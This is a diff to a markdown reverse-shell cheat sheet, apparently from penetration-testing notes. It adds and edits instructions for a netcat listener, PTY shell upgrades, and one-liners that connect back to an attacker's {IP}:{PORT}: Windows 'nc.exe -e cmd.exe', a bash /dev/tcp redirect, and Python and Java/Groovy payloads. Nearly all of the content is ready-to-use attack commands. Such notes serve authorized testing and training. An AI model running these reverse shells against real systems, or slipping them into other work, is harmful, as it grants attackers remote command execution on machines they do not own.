@@ -6,7 +6,11 @@ with a couple `IP:port` the server can access. Then, on your local machine you o
 a listener with `netcat`:
 
 ## On local machine
+
+### Listen with NetCat
+
 To listen for an incoming connection and upgrade to a pty shell:
+
 ```bash
 nc -lvnp {PORT}
 
@@ -14,32 +18,53 @@ nc -lvnp {PORT}
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+> On macOS use the `netcat` from [homebrew](https://formulae.brew.sh/formula/netcat)
+> instead of the one provided by the OS
+
+
+### Upgrade the shell
+
 Then, `Ctrl-Z` to suspend the connection and return to your own terminal.
 Type on your terminal:
+
 ```bash
 stty raw -echo
 ```
 
 The console should be black, next foreground the shell with:
+
 ```bash
 fg
 reset
 ```
 
-On target host
-```
+On target host:
+
+```bash
 export SHELL=bash
 export TERM=xterm-256color
 stty rows 24 columns 80
 ```
 
+Now you should have a complete shell with shortcuts available.
+
 
 ## On the remote server
 
 ### Windows
+
+Upload [`nc.exe`](/assets/nc.exe) (or [`nc64.exe`](/assets/nc64.exe)) on the
+remote server then use the command (same as [NetCat](#netcat)):
+
 ```bash
-> cmd.exe /C <cmd>
+cmd.exe /C "nc.exe {IP} {PORT} -e cmd.exe"
 ```
+
+
+### PowerShell
+
+This is explain in the [Windows / Download and execute script section](windows.md#download-and-execute-script).
+
 
 ### Python
 ```bash
@@ -50,6 +75,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```bash
 bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
 ```
+
+> To use the bash's built-in `/dev/tcp` device file the use must use `/bin/bash`
+> as shell. Often it uses `sh` or `dash`, then you can use `bash -c "<cmd>"` to
+> force the `bash`
+
 
 ### Netcat
 ```bash
@@ -62,7 +92,7 @@ r = Runtime.getRuntime();p = r.exec(["your payload"] as String[]);p.waitFor()
 String[] cmd={"cmd","/C","<cmd>"};Runtime.getRuntime().exec(cmd);
 ```
 
-This payload can also work with `BeanShell` scripts.
+> This payload can also work with `BeanShell` scripts.
 
 
 ### PHP
